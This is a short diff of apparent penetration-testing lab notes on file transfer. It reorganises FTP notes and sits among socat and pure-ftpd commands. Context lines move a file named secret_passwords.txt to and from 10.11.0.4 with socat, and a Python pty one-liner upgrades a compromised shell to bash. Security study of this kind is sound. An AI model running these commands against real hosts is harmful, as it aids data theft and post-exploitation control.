@@ -24,12 +24,6 @@ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
 socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 ```
 
-### FTP(permitted commands:ls,mkdir,put file, get file)
-```
-anonymous login: ftp ip; username:anonymous;password:blank; 
-ascii mode: ascii
-binary mode: bin
-```
 ### Pure-ftpd (Linux - Linux)
 #### install
 sudo apt update && sudo apt install pure-ftpd  
@@ -47,3 +41,11 @@ ftp 10.11.0.4
 bye  
 #### Upgrading a Non-Interactive Shell
 python -c 'import pty; pty.spawn("/bin/bash")'  
+#### mode
+bin(binary mode)
+ascii(ascii mode)
+#### transfer files
+```
+1. attack machine put files under ftphome dir
+2. get filename/put filename
+```
